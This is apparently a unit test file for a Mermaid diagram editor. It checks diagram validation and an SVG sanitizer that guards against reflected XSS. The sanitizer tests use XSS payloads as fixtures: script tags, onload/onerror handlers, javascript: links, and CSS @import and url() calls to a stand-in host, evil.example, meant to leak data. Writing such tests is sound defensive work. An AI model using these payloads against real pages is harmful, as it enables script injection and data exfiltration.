import { describe, it, expect } from 'vitest'
import { validateMermaid, sanitizeSvg } from '../lib/mermaid-engine'
import { mermaidSample } from '../lib/samples'

// validateMermaid uses mermaid.parse (grammar-only — runs in jsdom).
// renderMermaid needs real browser SVG measurement and is exercised in
// browser QA, not unit tests.
describe('mermaid engine validation', () => {
  it('accepts a valid flowchart', async () => {
    const result = await validateMermaid('flowchart LR\n  A --> B')
    expect(result.valid).toBe(true)
  })

  it('accepts the shipped default sample (the editor must never load broken)', async () => {
    const result = await validateMermaid(mermaidSample)
    expect(result.valid).toBe(true)
  })

  it('accepts a valid timeline diagram', async () => {
    const result = await validateMermaid(
      'timeline\n    title History\n    2024 : Research\n    2025 : Beta'
    )
    expect(result.valid).toBe(true)
  })

  it('accepts a valid pie chart', async () => {
    const result = await validateMermaid('pie title Pets\n    "Dogs" : 60\n    "Cats" : 40')
    expect(result.valid).toBe(true)
  })

  it('rejects invalid syntax with an error message', async () => {
    const result = await validateMermaid('flowchart LR\n  A -->> ??? B[')
    expect(result.valid).toBe(false)
    if (!result.valid) expect(result.error.length).toBeGreaterThan(0)
  })

  it('rejects empty input', async () => {
    const result = await validateMermaid('   ')
    expect(result.valid).toBe(false)
  })
})

describe('svg sanitization (reflected-XSS guard — input arrives via URL hash)', () => {
  it('strips script tags and event handlers from SVG', () => {
    const dirty =
      '<svg><script>alert(1)</script><rect onload="alert(2)" width="10"/><text>ok</text></svg>'
    const clean = sanitizeSvg(dirty)
    expect(clean).not.toContain('<script')
    expect(clean).not.toContain('onload')
    expect(clean).toContain('<text>ok</text>')
  })

  it('strips foreignObject (HTML-in-SVG vector)', () => {
    const dirty = '<svg><foreignObject><img src=x onerror=alert(1)></foreignObject><circle r="5"/></svg>'
    const clean = sanitizeSvg(dirty)
    expect(clean).not.toContain('foreignObject')
    expect(clean).toContain('<circle')
  })

  it('strips javascript: hrefs from anchors', () => {
    const dirty = '<svg><a href="javascript:alert(1)"><text>click</text></a></svg>'
    expect(sanitizeSvg(dirty)).not.toContain('javascript:')
  })

  it('strips @import from style elements (CSS exfil channel)', () => {
    const dirty = '<svg><style>@import url("https://evil.example/x.css"); .a{fill:red}</style><circle r="5"/></svg>'
    const clean = sanitizeSvg(dirty)
    expect(clean).not.toContain('@import')
    expect(clean).not.toContain('evil.example')
    expect(clean).toContain('fill:red')
  })

  it('neutralizes external url() in style elements, keeps local fragment refs', () => {
    const dirty = '<svg><style>.x{background:url("http://evil.example/leak")} .y{fill:url(#grad)}</style></svg>'
    const clean = sanitizeSvg(dirty)
    expect(clean).not.toContain('evil.example')
    expect(clean).toContain('url(#grad)')
  })

  it('neutralizes external url() in inline style attributes', () => {
    const dirty = '<svg style="background:url(http://evil.example/leak)"><rect width="5"/></svg>'
    const clean = sanitizeSvg(dirty)
    expect(clean).not.toContain('evil.example')
  })
})
